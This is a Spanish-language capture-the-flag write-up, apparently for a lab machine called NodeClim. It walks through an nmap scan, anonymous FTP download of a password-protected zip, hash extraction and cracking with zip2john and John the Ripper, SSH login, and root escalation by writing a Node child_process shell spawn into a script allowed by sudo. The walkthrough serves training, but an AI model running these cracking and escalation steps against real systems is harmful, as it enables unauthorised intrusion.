# NodeClim
![Image](https://github.com/user-attachments/assets/72d99b22-343e-4961-8d30-cb8024718ba2)


## Hacemos un nmap bien potente

```bash
sudo nmap -p- --open -sS -sV -sC -min-rate 5000 -vvv -Pn -n 172.17.0.2 
```

![Image](https://github.com/user-attachments/assets/fc5088c9-b575-49cb-bcef-bbe1ab3e6e58)

vemos que tenemos el puerto 22 (SSH) y el puerto 21 (FTP) vemos que podemos entrar como anonymous en FTP así que lo vamos hacer.

![Image](https://github.com/user-attachments/assets/d986421f-e506-4a11-b0f9-9aeba0e20ac6)



Al conectarnos por FTP vemos que hay un archivo en .zip, lo vamos a descargar y ver que puede tener. 
Con el siguiente comando los descargamos:

```bash
ftp> get secretitopicaron.zip
```

Una vez que lo tenemos toca poder ver que hay dentro de el, solo que al querer mirarlo nos pide contraseña así que vamos hacer lo siguiente.

Usamos *zip2john* para extraer el hash de la siguiente manera:

```bash
zip2john secretitopicaron.zip > hash.txt
```


Dentro del hash.txt nos dio esto:
```bash
> cat hash.txt    
secretitopicaron.zip/password.txt:$pkzip$1*2*2*0*34*28*59d5d024*0*46*0*34*4c03*ca77f2799f1414311ed5431ae8e9c6a1220f40fa3854acef077a9a0510124d4397da4f21d34e3002081b01c2a37d545d419c470a*$/pkzip$:password.txt:secretitopicaron.zip::secretitopicaron.zip
```


Ahora vamos a descifrar ese hash con *john* de la siguiente manera:

```bash
john hash.txt -w /usr/share/wordlists/rockyou.txt.gz
```

**John the Ripper** va a tomar el `hash.txt` (que representa la contraseña encriptada del archivo `.zip`) y va a intentar **romper esa contraseña** usando **todas las palabras** del archivo `rockyou.txt.gz`.

---


![Image](https://github.com/user-attachments/assets/17ce0d1f-6595-4074-b3d3-5384f9501962)



Nos da la contraseña del .zip así que vamos a mirar que tiene usando *unzip* para descomprimirlo.

nos descarga el archivo llamado password.txt y vamos a ver que tiene dentro.

![Image](https://github.com/user-attachments/assets/38657c73-90b5-4d6e-a2c4-1c67a48bbe85)


Ahora que vemos usuario y contraseña nos vamos a conectar por SSH de la siguiente manera:
```bash
ssh mario@172.17.0.2
```

Listo, ahora estamos dentro como mario, vamos por la escalada de privilegios y ser root.

![Image](https://github.com/user-attachments/assets/9682cc1e-aaba-4570-8d00-fec4b2d7d1f9)

---
Hacemos un **sudo -l** para ver que permisos se pueden tener y nos sale los siguiente:

```bash
Matching Defaults entries for mario on 7732a1776bdb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 7732a1776bdb:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```


El usuario `mario` **puede ejecutar como root** el siguiente comando **sin contraseña**:

`/usr/bin/node /home/mario/script.js` 

Así que con ayuda de *GTFOBins* vamos hacer esto.

Si hacemos un *ls* nos da lo siguiente: **script.js** y vemos que esta vacío así que con **nano** lo que vamos hacer es mandarnos una shell como root. vamos a *GTFOBins*
Copiamos el siguiente comando:

```
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

![Image](https://github.com/user-attachments/assets/d89430b8-39cd-4010-924b-e14e146724de)

---

Y lo metemos dentro de el script llamado *script.js* una vez ahí ahora si lo vamos a ejecutar de la siguiente manera:

```bash
sudo node /home/mario/script.js 
```

Ponemos el sudo para que se ejecute como root, sino lo ponemos seguimos siendo mario. Y no ponemos solo el nombre de script.js sino la ruta absoluta para que funcione mejor. Una vez que se ejecuta listo, ya somos root ->

![Image](https://github.com/user-attachments/assets/82f2696d-0c85-4ad8-8d89-c15cd3538235)

---

